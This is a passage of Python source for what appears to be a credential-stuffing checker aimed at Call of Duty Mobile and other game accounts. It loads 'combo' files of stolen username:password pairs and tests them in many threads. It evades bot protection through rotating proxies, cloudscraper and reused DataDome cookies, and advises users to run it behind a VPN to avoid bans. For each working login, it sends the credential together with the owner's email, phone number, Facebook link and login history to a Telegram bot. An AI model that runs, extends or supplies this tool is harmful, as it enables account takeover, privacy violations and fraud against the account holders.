    if len(parts) == 4:
        a, b, c, d = parts
        if b.isdigit():
            host, port, user, pw = a, b, c, d
        elif d.isdigit():
            user, pw, host, port = a, b, c, d
        else:
            return None
        user_enc = urllib.parse.quote(user, safe="-._~")
        pw_enc = urllib.parse.quote(pw, safe="-._~")
        return f"http://{user_enc}:{pw_enc}@{host}:{port}"
    return None

_hybrid_pool = []
_hybrid_index = 0
_hybrid_lock = threading.Lock()

def _hybrid_next():
    global _hybrid_index
    if not _hybrid_pool:
        return None
    with _hybrid_lock:
        entry = _hybrid_pool[_hybrid_index % len(_hybrid_pool)]
        _hybrid_index += 1
    if entry is None:
        return None
    return {"http": entry, "https": entry}

def prompt_proxy_setup():
    global proxy_manager, _hybrid_pool, _hybrid_index
    clear_screen()
    display_banner()

    proxy_choice = ask_config(
        "PROXY CONFIG",
        "SELECT PROXY MODE",
        [
            ("1", "PROXY FILE — load from proxies.txt"),
            ("2", "PROXY URL — single endpoint"),
            ("3", "NO PROXY — direct connection"),
            ("4", "HYBRID — proxy + direct slots")
        ]
    )

    if proxy_choice == "1":
        raw = console.input("  [bold #D4C4A8]> Proxy filename (Enter for proxies.txt): [/]").strip()
        file_input = raw if raw else "proxies.txt"
        fpath = Path(file_input)
        if not fpath.exists():
            console.print(f"  [{THEME_ERROR}]File not found: {fpath}[/]")
            proxy_manager = ProxyManager(enabled=False)
        else:
            raw_lines = fpath.read_text(encoding="utf-8", errors="ignore").splitlines()
            parsed_urls = []
            for line in raw_lines:
                url = _parse_proxy_line(line)
                if url:
                    parsed_urls.append(url)
            if not parsed_urls:
                console.print(f"  [{THEME_ERROR}]No valid proxies found in file.[/]")
                proxy_manager = ProxyManager(enabled=False)
            else:
                console.print(f"  [{THEME_SUCCESS}]Loaded {len(parsed_urls)} proxies from [cyan]{fpath.name}[/][/]")
                check_ans = console.input("  [bold #D4C4A8]> Check proxies before starting? (y/N): [/]").strip().lower()
                if check_ans == "y":
                    console.print("")
                    parsed_urls = _validate_proxies_bulk(parsed_urls, indent="  ")
                    if not parsed_urls:
                        console.print(f"  [{THEME_ERROR}]No working proxies after check — disabled.[/]")
                        proxy_manager = ProxyManager(enabled=False)
                        console.print("")
                        return
                proxy_manager = ProxyManager(enabled=True, fallback_url="")
                proxy_manager.proxies = parsed_urls
                proxy_manager.enabled = True
                console.print(f"  [{THEME_SUCCESS}]✔ {len(parsed_urls)} proxies ready.[/]")
    elif proxy_choice == "2":
        url_input = console.input("  [bold #D4C4A8]> Proxy URL: [/]").strip()
        if url_input:
            normalised = _parse_proxy_line(url_input)
            if not normalised:
                console.print(f"  [{THEME_ERROR}]Could not parse proxy format — disabled.[/]")
                proxy_manager = ProxyManager(enabled=False)
            else:
                console.print(f"  [{THEME_SUCCESS}]Proxy URL set: [cyan]{normalised}[/][/]")
                check_ans = console.input("  [bold #D4C4A8]> Check proxy before starting? (y/N): [/]").strip().lower()
                if check_ans == "y":
                    console.print("")
                    working = _validate_proxies_bulk([normalised], indent="  ")
                    if not working:
                        console.print(f"  [{THEME_ERROR}]Proxy is dead — disabled.[/]")
                        proxy_manager = ProxyManager(enabled=False)
                        console.print("")
                        return
                    console.print(f"  [{THEME_SUCCESS}]✔ Proxy is working.[/]")
                proxy_manager = ProxyManager(proxy_file="", fallback_url=normalised, enabled=True)
        else:
            proxy_manager = ProxyManager(enabled=False)
    elif proxy_choice == "3":
        proxy_manager = ProxyManager(enabled=False)
        console.print(f"  [dim]No proxy — direct connection.[/]")
    elif proxy_choice == "4":
        raw = console.input("  [bold #D4C4A8]> Proxy filename (Enter for proxies.txt): [/]").strip()
        file_input = raw if raw else "proxies.txt"
        fpath = Path(file_input)
        parsed_urls = []
        if fpath.exists():
            for line in fpath.read_text(encoding="utf-8", errors="ignore").splitlines():
                url = _parse_proxy_line(line)
                if url:
                    parsed_urls.append(url)
        raw_direct = console.input("  [bold #D4C4A8]> Direct slots per proxy (Enter for 1): [/]").strip()
        try:
            direct_slots = max(1, int(raw_direct))
        except:
            direct_slots = 1
        if not parsed_urls:
            console.print(f"  [{THEME_WARNING}]No proxies found — falling back to direct only.[/]")
            proxy_manager = ProxyManager(enabled=False)
        else:
            console.print(f"  [{THEME_SUCCESS}]Loaded {len(parsed_urls)} proxies.[/]")
            check_ans = console.input("  [bold #D4C4A8]> Check proxies before starting? (y/N): [/]").strip().lower()
            if check_ans == "y":
                console.print("")
                parsed_urls = _validate_proxies_bulk(parsed_urls, indent="  ")
                if not parsed_urls:
                    console.print(f"  [{THEME_ERROR}]No working proxies after check — disabled.[/]")
                    proxy_manager = ProxyManager(enabled=False)
                    console.print("")
                    return
            _hybrid_pool = []
            _hybrid_index = 0
            for url in parsed_urls:
                _hybrid_pool.append(url)
                for _ in range(direct_slots):
                    _hybrid_pool.append(None)
            proxy_manager = ProxyManager(enabled=False)
            proxy_manager._hybrid = True
            console.print(
                f"  [bold {THEME_PRIMARY}]Hybrid mode:[/bold {THEME_PRIMARY}] "
                f"[{THEME_SUCCESS}]{len(parsed_urls)} proxies[/] + "
                f"[{THEME_PRIMARY}]{direct_slots} direct slot(s) each[/]  "
                f"→ pool of [white]{len(_hybrid_pool)}[/white] connections, rotating infinitely"
            )
    console.print("")

def _validate_proxy(url: str, timeout: float = 5.0) -> tuple[bool, str, float]:
    import base64
    import socket
    try:
        _p = urllib.parse.urlparse(url)
        proxy_host = _p.hostname or ""
        proxy_port = _p.port or 8080
        raw_user = urllib.parse.unquote(_p.username or "")
        raw_pass = urllib.parse.unquote(_p.password or "")
    except:
        return False, "parse_err", -1.0
    if not proxy_host:
        return False, "no_host", -1.0
    if raw_user:
        cred_str = f"{raw_user}:{raw_pass}"
        proxy_auth = "Basic " + base64.b64encode(cred_str.encode("utf-8")).decode("ascii")
    else:
        proxy_auth = None
    _RAW_TARGETS = [("ip-api.com", 80, "/json/?fields=query,status"), ("api.ipify.org", 80, "/?format=json")]
    last_err = "dead"
    for target_host, target_port, target_path in _RAW_TARGETS:
        sock = None
        try:
            t0 = time.monotonic()
            sock = socket.create_connection((proxy_host, proxy_port), timeout=timeout)
            sock.settimeout(timeout)
            req_lines = [f"GET http://{target_host}{target_path} HTTP/1.1", f"Host: {target_host}", "Accept: application/json", "Connection: close"]
            if proxy_auth:
                req_lines.append(f"Proxy-Authorization: {proxy_auth}")
            req_lines += ["", ""]
            raw_req = "\r\n".join(req_lines).encode("utf-8")
            sock.sendall(raw_req)
            data = b""
            while len(data) < 4096:
                chunk = sock.recv(4096)
                if not chunk:
                    break
                data += chunk
                if b"\r\n\r\n" in data and len(data) > 200:
                    break
            latency_ms = (time.monotonic() - t0) * 1000
            response = data.decode("utf-8", errors="replace")
            status_line = response.split("\r\n", 1)[0] if response else ""
            parts = status_line.split(" ", 2)
            status_code = int(parts[1]) if len(parts) >= 2 and parts[1].isdigit() else 0
            if status_code == 200:
                body = response.split("\r\n\r\n", 1)[-1].strip()
                if body and body[0] in "0123456789abcdefABCDEF":
                    body = body.split("\r\n", 1)[-1].split("\r\n")[0].strip()
                try:
                    jdata = json.loads(body)
                    ip = jdata.get("query") or jdata.get("ip") or "?"
                    return True, str(ip).split(",")[0].strip(), latency_ms
                except:
                    return True, "alive(no-ip)", latency_ms
            elif status_code == 407:
                last_err = "auth_failed(407)"
            elif status_code in (401, 403):
                last_err = f"auth_denied({status_code})"
            elif status_code != 0:
                last_err = f"http_{status_code}"
        except socket.timeout:
            last_err = "connect_timeout"
        except ConnectionRefusedError:
            last_err = "connection_refused"
            break
        except socket.gaierror:
            last_err = "dns_fail"
            break
        except Exception as e:
            last_err = type(e).__name__
        finally:
            if sock:
                try:
                    sock.close()
                except:
                    pass
    if last_err not in ("auth_failed(407)", "auth_denied(403)", "auth_denied(401)", "dns_fail", "connection_refused"):
        try:
            t0 = time.monotonic()
            with socket.create_connection((proxy_host, proxy_port), timeout=timeout):
                pass
            latency_ms = (time.monotonic() - t0) * 1000
            return True, f"alive(no-ip,{last_err})", latency_ms
        except:
            pass
    return False, last_err, -1.0

def _display_proxy_quality(valid_count: int, total_count: int, avg_latency_ms: float, indent: str = "    ") -> None:
    if total_count == 0:
        return
    success_rate = (valid_count / total_count) * 100
    if success_rate >= 50 and 0 < avg_latency_ms <= 1500:
        tier, tier_color, tier_icon, rec_threads, rec_note = "HIGH", "bold #96AA7A", "🟢", "up to 20", "Maximum throughput — your proxies can handle it."
    elif success_rate >= 30 or (0 < avg_latency_ms <= 2500):
        tier, tier_color, tier_icon, rec_threads, rec_note = "MEDIUM", "bold #C4A47A", "🟡", "8 – 12", "Balanced speed/accuracy — avoid pushing higher."
    else:
        tier, tier_color, tier_icon, rec_threads, rec_note = "LOW", "bold #8C7A6B", "🔴", "3 – 5", "Too many dead/slow proxies — fewer threads avoids false results."
    lat_str = f"{avg_latency_ms:.0f} ms" if avg_latency_ms > 0 else "N/A"
    tbl = Table(box=None, show_header=False, show_edge=False, padding=(0, 1), expand=False)
    tbl.add_column(justify="left", no_wrap=False)
    tbl.add_row(f"[{tier_color}]{tier_icon}  Quality Rating   :[/] [{tier_color}]{tier}[/]")
    tbl.add_row(f"📊  Success Rate    :  [bold]{success_rate:.1f}%[/bold]  ({valid_count:,} valid / {total_count:,} total)")
    tbl.add_row(f"⚡  Avg Latency     :  [bold]{lat_str}[/bold]")
    tbl.add_row("")
    tbl.add_row(f"🧵  Recommended Checker Threads :  [bold {THEME_PRIMARY}]{rec_threads}[/]")
    tbl.add_row(f"[dim]💬  {rec_note}[/dim]")
    panel = Panel(tbl, title="[bold white] PROXY QUALITY REPORT [/bold white]", border_style=THEME_BORDER, padding=(0, 1), expand=False)
    console.print("")
    console.print(indent, panel, sep="")
    console.print("")

def _validate_proxies_bulk(urls: list[str], timeout: float = 5.0, max_workers: int = 500, indent: str = "    ") -> list[str]:
    total = len(urls)
    workers = min(max_workers, total)
    valid = []
    invalid = []
    latencies = []
    lock = threading.Lock()
    _speed_checked = [0]
    _speed_ts = [time.monotonic()]
    _speed_rate = [0.0]
    from rich.progress import Progress, SpinnerColumn, BarColumn, MofNCompleteColumn, TextColumn, TimeElapsedColumn, TimeRemainingColumn
    progress = Progress(SpinnerColumn(), TextColumn("[bold #D4C4A8]Validating"), BarColumn(bar_width=30), TextColumn("[progress.percentage]{task.percentage:>3.0f}%"), MofNCompleteColumn(), TextColumn("│ [green]{task.fields[valid]}✔[/green] [red]{task.fields[invalid]}✖[/red]"), TextColumn("│ [yellow]{task.fields[speed]}[/yellow]"), TimeElapsedColumn(), TextColumn("ETA"), TimeRemainingColumn(), console=console, refresh_per_second=12)
    with progress:
        task = progress.add_task("Validating", total=total, valid=0, invalid=0, speed="-- /s")
        def _check(url: str) -> None:
            ok, _, lat = _validate_proxy(url, timeout=timeout)
            with lock:
                if ok:
                    valid.append(url)
                    if lat > 0:
                        latencies.append(lat)
                else:
                    invalid.append(url)
                done = len(valid) + len(invalid)
                now = time.monotonic()
                elapsed = now - _speed_ts[0]
                _speed_checked[0] += 1
                if _speed_checked[0] >= 50 or elapsed >= 1.0:
                    _speed_rate[0] = _speed_checked[0] / max(elapsed, 0.001)
                    _speed_checked[0] = 0
                    _speed_ts[0] = now
                progress.update(task, completed=done, valid=len(valid), invalid=len(invalid), speed=f"{_speed_rate[0]:.0f}/s")
        with ThreadPoolExecutor(max_workers=workers) as ex:
            futures = [ex.submit(_check, u) for u in urls]
            for f in as_completed(futures):
                try:
                    f.result()
                except:
                    pass
    elapsed_total = time.monotonic() - _speed_ts[0]
    avg_speed = total / max(elapsed_total, 0.001)
    console.print("")
    console.print(indent + f"  [bold green]✔ Valid:  {len(valid):,}[/bold green]   " + f"[bold red]✖ Dead:  {len(invalid):,}[/bold red]   " + f"[dim]│  ~{avg_speed:.0f} proxies/s  │  {workers} threads  │  {timeout}s timeout[/dim]")
    avg_latency_ms = (sum(latencies) / len(latencies)) if latencies else -1.0
    _display_proxy_quality(len(valid), total, avg_latency_ms, indent)
    return valid

def bulk_check():
    global proxy_manager, CHECK_OTHER_GAMES
    clear_screen()
    display_banner()

    file_manager = AccountFileManager()
    file_viewer = AccountFileViewer()
    combo_files = file_manager.scan_combo_folder()
    if not combo_files:
        console.print("[red]No combo files found in 'Combo' folder. Add .txt files and retry.[/red]")
        return
    file_infos = []
    for file_path in combo_files:
        info = file_manager.get_file_info(file_path)
        if info:
            file_infos.append(info)
    if not file_infos:
        console.print("[red]No valid combo files found.[/red]")
        return
    file_viewer.display_file_table(file_infos)
    selected_file = file_viewer.prompt_file_selection(file_infos)

    clean_choice = ask_config(
        "FILE CLEANING",
        "CLEAN FILE ENCODING?",
        [("Y", "YES, REMOVE INVALID CHARACTERS"), ("N", "NO, KEEP AS IS")]
    )
    if clean_choice == 'y':
        with console.status("[yellow]Cleaning file encoding...[/yellow]", spinner="dots"):
            valid_count, invalid_count = file_manager.clean_file_encoding(selected_file)
        console.print(f"  [{THEME_SUCCESS}]Cleaned: {valid_count} valid, {invalid_count} removed[/]")

    dup_choice = ask_config(
        "DUPLICATE REMOVAL",
        "REMOVE DUPLICATE LINES?",
        [("Y", "YES, REMOVE DUPLICATES"), ("N", "NO, KEEP AS IS")]
    )
    if dup_choice == 'y':
        with console.status("[yellow]Removing duplicates...[/yellow]", spinner="dots"):
            removed = file_manager.clean_duplicates(selected_file)
        console.print(f"  [{THEME_SUCCESS}]Removed {removed} duplicate(s)[/]")

    auto_remove = ask_config(
        "AUTO-REMOVE",
        "REMOVE CHECKED ACCOUNTS FROM COMBO?",
        [("Y", "YES, REMOVE AFTER CHECKING"), ("N", "NO, KEEP ORIGINAL")]
    ) == 'y'

    clear_screen()
    display_banner()

    accounts = []
    try:
        with open(selected_file, 'r', encoding='utf-8', errors='ignore') as file:
            for line in file:
                account, password = clean_account_line(line)
                if account and password:
                    accounts.append(f"{account}:{password}")
        console.print(f"[{THEME_SUCCESS}]File loaded: {len(accounts)} accounts[/]")
    except:
        console.print(f"[{THEME_ERROR}]Could not read file.[/]")
        return

    if not accounts:
        console.print(f"[{THEME_ERROR}]No valid accounts found in file.[/]")
        return

    console.print(f"  [{THEME_PRIMARY}]Total accounts: {len(accounts)}[/]\n")

    thread_choice = ask_config(
        "THREAD CONFIGURATION",
        "SELECT THREAD MODE",
        [
            ("1", "01-03 — Negligible"),
            ("2", "04-07 — Marginal"),
            ("3", "08-11 — Moderate"),
            ("4", "12-15 — Significant"),
            ("5", "16-19 — Substantial"),
            ("6", "20-23 — High"),
            ("7", "24-27 — Severe"),
            ("8", "28-30 — Critical")
        ]
    )
    num_threads = THREAD_MODES[thread_choice]
    console.print(f"  [{THEME_SUCCESS}]Running with {num_threads} thread(s)[/]\n")

    CHECK_OTHER_GAMES = ask_config(
        "GAME CONNECTIONS",
        "CHECK OTHER GAMES? (AOV, ROV, Free Fire, etc.)",
        [("Y", "YES, SCAN ALL GAMES"), ("N", "CODM ONLY")]
    ) == 'y'

    results_manager = ResultsManager()
    cookie_manager = CookieManager(server_url=SERVER_COOKIE_URL)
    live_stats = LiveStats()
    live_stats.set_total(len(accounts))
    if proxy_manager:
        proxy_manager.set_thread_count(num_threads)

    _TG_CFG_FILE = os.path.join(_SCRIPT_DIR_COOKIE, '.tg_cfg')

    def _tg_save(token, chat_id, mode, clean_range, nc_range):
        try:
            import json as _j
            with open(_TG_CFG_FILE, 'w', encoding='utf-8') as _f:
                _j.dump({'token': token, 'chat_id': chat_id, 'mode': mode, 'clean': clean_range, 'nc': nc_range}, _f)
        except:
            pass

    def _tg_load():
        try:
            import json as _j
            if not os.path.exists(_TG_CFG_FILE):
                return None
            with open(_TG_CFG_FILE, 'r', encoding='utf-8') as _f:
                d = _j.load(_f)
            if d.get('token') and d.get('chat_id'):
                return d
        except:
            pass
        return None

    _saved_tg = _tg_load()

    console.print(Panel(
        "[white]  [1]  Send Clean hits only\n"
        "  [2]  Send Not-Clean hits only\n"
        "  [3]  Send Both  (clean + not-clean)\n"
        "  [4]  No Telegram  (skip)[/]",
        title=f"[bold {THEME_WARNING}]TELEGRAM NOTIFICATION SETUP[/]",
        border_style=THEME_BORDER, padding=(0, 2)
    ))
    console.print("")

    tg_choice = ""
    while tg_choice not in ("1", "2", "3", "4"):
        tg_choice = console.input("  [bold #D4C4A8]@Kingz[/] [white]➤[/] ").strip()

    TG_ENABLED = tg_choice != "4"
    TG_SEND_CLEAN = tg_choice in ("1", "3")
    TG_SEND_NOTCLEAN = tg_choice in ("2", "3")

    TG_BOT_TOKEN = ""
    TG_CHAT_ID = ""
    TG_LVL_MIN_CLEAN = 0
    TG_LVL_MAX_CLEAN = 9999
    TG_LVL_MIN_NOTCLEAN = 0
    TG_LVL_MAX_NOTCLEAN = 9999

    if TG_ENABLED:
        console.print("")
        if _saved_tg:
            _masked = f"...{_saved_tg['token'][-6:]}" if len(_saved_tg['token']) > 6 else "******"
            console.print(f"  [bold green]Saved config found[/bold green] [dim]Token: {_masked} | Chat: {_saved_tg['chat_id']}[/dim]")
            _use_saved = console.input("  [bold #C4A47A]Use saved token/ID? (y/n): [/]").strip().lower()
            if _use_saved == "y":
                TG_BOT_TOKEN = _saved_tg['token']
                TG_CHAT_ID = _saved_tg['chat_id']
                _cr = _saved_tg.get('clean', [0, 9999])
                _nr = _saved_tg.get('nc', [0, 9999])
                TG_LVL_MIN_CLEAN = _cr[0] if TG_SEND_CLEAN else 0
                TG_LVL_MAX_CLEAN = _cr[1] if TG_SEND_CLEAN else 9999
                TG_LVL_MIN_NOTCLEAN = _nr[0] if TG_SEND_NOTCLEAN else 0
                TG_LVL_MAX_NOTCLEAN = _nr[1] if TG_SEND_NOTCLEAN else 9999
                console.print(f"  [bold green]✔ Using saved config.[/]")
            else:
                _saved_tg = None
        if not _saved_tg:
            TG_BOT_TOKEN = console.input("  [bold #D4C4A8]Bot Token: [/]").strip()
            TG_CHAT_ID = console.input("  [bold #D4C4A8]Chat ID: [/]").strip()
            if TG_SEND_CLEAN:
                console.print("")
                console.print("  [dim]Level range for [green]CLEAN[/green] hits — format: min-max (e.g. 50-400)[/dim]")
                raw_clean = console.input("  [bold green]Clean level range (Enter = all): [/]").strip()
                if raw_clean and "-" in raw_clean:
                    try:
                        parts = raw_clean.split("-")
                        TG_LVL_MIN_CLEAN = int(parts[0].strip())
                        TG_LVL_MAX_CLEAN = int(parts[1].strip())
                    except:
                        pass
            if TG_SEND_NOTCLEAN:
                console.print("")
                console.print("  [dim]Level range for [red]NOT-CLEAN[/red] hits — format: min-max (e.g. 1-200)[/dim]")
                raw_nc = console.input("  [bold red]Not-clean level range (Enter = all): [/]").strip()
                if raw_nc and "-" in raw_nc:
                    try:
                        parts = raw_nc.split("-")
                        TG_LVL_MIN_NOTCLEAN = int(parts[0].strip())
                        TG_LVL_MAX_NOTCLEAN = int(parts[1].strip())
                    except:
                        pass
            if TG_BOT_TOKEN and TG_CHAT_ID:
                _tg_save(TG_BOT_TOKEN, TG_CHAT_ID, tg_choice, [TG_LVL_MIN_CLEAN, TG_LVL_MAX_CLEAN], [TG_LVL_MIN_NOTCLEAN, TG_LVL_MAX_NOTCLEAN])
                console.print("  [dim]Config saved for next time.[/dim]")
        console.print("")
        console.print(f"  [bold green]✔ Telegram configured.[/]")
        if TG_SEND_CLEAN:
            console.print(f"  [dim]Clean hits : Level [green]{TG_LVL_MIN_CLEAN}–{TG_LVL_MAX_CLEAN}[/][/dim]")
        if TG_SEND_NOTCLEAN:
            console.print(f"  [dim]Not-clean : Level [red]{TG_LVL_MIN_NOTCLEAN}–{TG_LVL_MAX_NOTCLEAN}[/][/dim]")
        console.print("")

    def _build_tg_message(acc, pwd, ad, is_clean_hit):
        lvl = ad.get('codm_level', 0)
        region = ad.get('codm_region', 'N/A')
        nick = ad.get('codm_nickname', 'N/A')
        uid = ad.get('uid', 'N/A')
        country = ad.get('country', 'N/A')
        fb = ad.get('fb_info', 'N/A')
        fb_link = ad.get('fb_link', 'N/A')
        shell = ad.get('shell_balance', 0)
        email_d = ad.get('email_display', 'N/A')
        mobile = ad.get('formatted_mobile', 'N/A')
        login_d = ad.get('last_login_date', 'N/A')
        login_w = ad.get('last_login_where', 'N/A')
        status = ad.get('account_status', 'N/A')
        tag = "✅ CLEAN" if is_clean_hit else "⚠️ NOT CLEAN"
        lines = [f"{'✅ CLEAN HIT' if is_clean_hit else '⚠️ NOT CLEAN HIT'}", "━━━━━━━━━━━━━━━━━━━━━━━━━━", f"Credential : {acc}:{pwd}", f"Status     : {tag}", "━━━━━━━━━━━━━━━━━━━━━━━━━━", f"Nickname   : {nick}", f"UID        : {uid}", f"Level      : {lvl}", f"Region     : {region}", f"Country    : {country}", "━━━━━━━━━━━━━━━━━━━━━━━━━━", f"Email      : {email_d}", f"Mobile     : {mobile}", f"Facebook   : {fb}"]
        if fb_link != 'N/A':
            lines.append(f"FB Link    : {fb_link}")
        lines += [f"Shells     : {shell}", f"Acc Status : {status}", f"Last Login : {login_d}", f"Login Via  : {login_w}", "━━━━━━━━━━━━━━━━━━━━━━━━━━", "Powered by: @rrielqt"]
        return "\n".join(lines)

    def _send_tg(token, chat_id, text, silent=False):
        try:
            import urllib.request as _ur, urllib.parse as _up
            payload = {"chat_id": chat_id, "text": text, "disable_notification": silent, "parse_mode": "HTML"}
            data = _up.urlencode(payload).encode()
            req = _ur.Request(f"https://api.telegram.org/bot{token}/sendMessage", data=data, method="POST")
            _ur.urlopen(req, timeout=8)
        except:
            pass

    def _maybe_send_tg(account_data):
        if account_data.get('is_error') or not account_data.get('has_codm'):
            return
        is_clean = account_data.get('is_clean', False)
        lvl = account_data.get('codm_level', 0)
        acc = account_data.get('account', '')
        pwd = account_data.get('password', '')
        msg = _build_tg_message(acc, pwd, account_data, is_clean)
        if TG_ENABLED:
            if is_clean and TG_SEND_CLEAN and TG_LVL_MIN_CLEAN <= lvl <= TG_LVL_MAX_CLEAN:
                threading.Thread(target=_send_tg, args=(TG_BOT_TOKEN, TG_CHAT_ID, msg, False), daemon=True).start()
            elif not is_clean and TG_SEND_NOTCLEAN and TG_LVL_MIN_NOTCLEAN <= lvl <= TG_LVL_MAX_NOTCLEAN:
                threading.Thread(target=_send_tg, args=(TG_BOT_TOKEN, TG_CHAT_ID, msg, False), daemon=True).start()

    global _TG_HOOK
    _TG_HOOK = _maybe_send_tg

    if proxy_manager:
        proxy_manager.set_thread_count(num_threads)

    chunks = [accounts[i:i + SESSION_CHUNK_SIZE] for i in range(0, len(accounts), SESSION_CHUNK_SIZE)]
    total_chunks = len(chunks)

    from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn, TimeElapsedColumn
    with Progress(SpinnerColumn(), TextColumn("[progress.description]{task.description}"), BarColumn(complete_style="green", finished_style="bright_green", bar_width=20), TextColumn("[progress.percentage]{task.percentage:>3.0f}%"), TextColumn("[cyan]{task.completed}/{task.total}"), TimeElapsedColumn(), console=console) as progress:
        task = progress.add_task(f"[cyan]Processing with {num_threads} thread(s)...", total=len(accounts))
        overall_done = 0
        stats_lock = threading.Lock()
        for chunk_idx, chunk in enumerate(chunks, 1):
            if chunk_idx > 1:
                sep = "─" * 52
                console.print(f"\n[bold bright_yellow]{sep}[/bold bright_yellow]\n  [bold bright_yellow]⟳  SESSION RESTART[/bold bright_yellow]  [dim]chunk {chunk_idx}/{total_chunks}  ·  {overall_done:,} done  ·  {len(accounts) - overall_done:,} remaining[/dim]\n  [dim]Fresh sessions + cookies — live stats continue[/dim]\n[bold bright_yellow]{sep}[/bold bright_yellow]\n")
            _thread_local = threading.local()
            def _get_thread_resources():
                if not hasattr(_thread_local, "session"):
                    _thread_local.thread_id = proxy_manager.assign_thread_id() if proxy_manager else 0
                    _thread_local.session = cloudscraper.create_scraper()
                    if proxy_manager:
                        if getattr(proxy_manager, "_hybrid", False):
                            pd = _hybrid_next()
                            if pd:
                                _thread_local.session.proxies.update(pd)
                        else:
                            proxy_manager.apply_to_session(_thread_local.session, _thread_local.thread_id)
                    _thread_local.datadome = DataDomeManager()
                    valid_cookies = cookie_manager.get_valid_cookies()
                    if valid_cookies:
                        combined = "; ".join(valid_cookies)
                        applyck(_thread_local.session, combined)
                        dd_line = valid_cookies[-1]
                        if "datadome=" in dd_line:
                            for part in dd_line.split(";"):
                                part = part.strip()
                                if part.startswith("datadome="):
                                    _thread_local.datadome.set_datadome(part.split("=", 1)[1].strip())
                                    break
                    else:
                        dd = get_datadome_cookie(_thread_local.session)
                        if dd:
                            _thread_local.datadome.set_datadome(dd)
                return _thread_local.session, _thread_local.datadome, _thread_local.thread_id
            def _worker(account_line):
                if ":" not in account_line:
                    return
                try:
                    account, password = account_line.split(":", 1)
                    account = account.strip()
                    password = password.strip()
                    session, datadome_mgr, thread_id = _get_thread_resources()
                    proxy_manager.apply_to_session(session, thread_id)
                    current_proxy = proxy_manager.current_url
                    try:
                        processaccount(session, account, password, cookie_manager, datadome_mgr, live_stats, results_manager, file_manager, selected_file, auto_remove)
                        proxy_manager.report_success(current_proxy)
                    except (ConnectionError, TimeoutError, OSError):
                        proxy_manager.report_error(current_proxy)
                        raise
                    if proxy_manager and proxy_manager.tick():
                        proxy_manager.apply_to_session(session, thread_id)
                except:
                    logger.error("[ERROR] Thread error processing account")
            def _wrapped_worker(account_line):
                nonlocal overall_done
                _worker(account_line)
                progress.advance(task)
                should_print = False
                with stats_lock:
                    overall_done += 1
                    if overall_done % 10 == 0 or overall_done == len(accounts):
                        should_print = True
                if should_print:
                    console.print(live_stats.display_stats())
            try:
                with ThreadPoolExecutor(max_workers=num_threads) as executor:
                    futures = {executor.submit(_wrapped_worker, ln): ln for ln in chunk}
                    for future in as_completed(futures):
                        try:
                            future.result(timeout=20)
                        except TimeoutError:
                            logger.error(f"[TIMEOUT] Skipping: {futures[future][:30]}")
                            progress.advance(task)
                        except:
                            console.print("  [red]Thread error[/red]")
            except KeyboardInterrupt:
                console.print("\n  [bold yellow]⚠  Ctrl+C — stopping...[/bold yellow]")
                executor.shutdown(wait=False, cancel_futures=True)
                break
    console.print("\n")
    live_stats.display_final_stats()
    _flush_auto_remove(file_manager, selected_file, force=True)
    console.print(f"  [dim]Results saved in real-time to Results/ folder.[/dim]")
    console.print("\n")
    console.input("  [dim]Press Enter to return to menu...[/dim]")

def validator_check():
    clear_screen()
    display_banner()

    console.print(Panel("[bold #8C7A6B]⚠  USE A VPN BEFORE VALIDATING[/bold #8C7A6B]\n[dim]ExpressVPN or any VPN is strongly recommended to avoid IP bans during credential checking.[/dim]", border_style="grey50", padding=(0, 2)))
    console.print("")

    console.print(Panel("[dim]Login-only credential check — no game data fetched.\nResults saved to [cyan]Results/validator_*/[/cyan] folder.[/dim]", title=f"[bold {THEME_WARNING}]VALIDATOR[/]", border_style="grey50", padding=(0, 2)))
    console.print("")

    file_manager = AccountFileManager()
    file_viewer = AccountFileViewer()
    combo_files = file_manager.scan_combo_folder()
    if not combo_files:
        console.print("  [red]No .txt files found in Combo folder.[/red]")
        console.input("\n  [dim]Press Enter to return to menu...[/dim]")
        return

    file_infos = []
    for file_path in combo_files:
        info = file_manager.get_file_info(file_path)
        if info:
            file_infos.append(info)
    if not file_infos:
        console.print("  [red]No valid combo files.[/red]")
        console.input("\n  [dim]Press Enter to return to menu...[/dim]")
        return

    file_viewer.display_file_table(file_infos)
    selected_file = file_viewer.prompt_file_selection(file_infos)

    accounts = []
    with open(selected_file, "r", encoding="utf-8", errors="ignore") as fh:
        for line in fh:
            acc, pw = clean_account_line(line)
            if acc and pw:
                accounts.append((acc, pw))

    if not accounts:
        console.print("  [red]No valid account:password lines found.[/red]")
        console.input("\n  [dim]Press Enter to return to menu...[/dim]")
        return

    console.print(f"  [{THEME_PRIMARY}]Loaded [bold]{len(accounts):,}[/bold] combos[/]\n")

    thread_choice = ask_config(
        "THREAD CONFIGURATION",
        "SELECT THREAD MODE",
        [
            ("1", "01-03 — Negligible"),
            ("2", "04-07 — Marginal"),
            ("3", "08-11 — Moderate"),
            ("4", "12-15 — Significant"),
            ("5", "16-19 — Substantial"),
            ("6", "20-23 — High"),
            ("7", "24-27 — Severe"),
            ("8", "28-30 — Critical")
        ]
    )
    num_threads = THREAD_MODES[thread_choice]
    console.print(f"  [{THEME_SUCCESS}]Running with {num_threads} thread(s)[/]\n")

    stem = Path(selected_file).stem
    ts_str = datetime.now().strftime("%Y%m%d_%H%M%S")
    out_dir = Path("Results") / f"validator_{stem}_{ts_str}"
    out_dir.mkdir(parents=True, exist_ok=True)

    valid_path = out_dir / "valid.txt"
    invalid_path = out_dir / "invalid.txt"
    error_path = out_dir / "errors.txt"

    valid_fh = open(valid_path, "a", encoding="utf-8", buffering=1)
    invalid_fh = open(invalid_path, "a", encoding="utf-8", buffering=1)
    error_fh = open(error_path, "a", encoding="utf-8", buffering=1)

    vl = {"valid": 0, "invalid": 0, "error": 0, "done": 0}
    st_lock = threading.Lock()
    file_lock = threading.Lock()
    stop_ev = threading.Event()
    print_lock = threading.Lock()
    start_time = time.time()
    total = len(accounts)

    cookie_manager_val = CookieManager(server_url=SERVER_COOKIE_URL)
    _tl = threading.local()

    def _get_sess():
        if not hasattr(_tl, "s"):
            _tl.thread_id = proxy_manager.assign_thread_id() if proxy_manager else 0
            s = cloudscraper.create_scraper()
            if proxy_manager:
                if getattr(proxy_manager, "_hybrid", False):
                    pd = _hybrid_next()
                    if pd:
                        s.proxies.update(pd)
                else:
                    proxy_manager.apply_to_session(s, _tl.thread_id)
            dm = DataDomeManager()
            cks = cookie_manager_val.get_valid_cookies()
            if cks:
                applyck(s, "; ".join(cks))
                for part in cks[-1].split(";"):
                    part = part.strip()
                    if part.startswith("datadome="):
                        dm.set_datadome(part.split("=", 1)[1].strip())
                        break
            else:
                dd = get_datadome_cookie(s)
                if dd:
                    dm.set_datadome(dd)
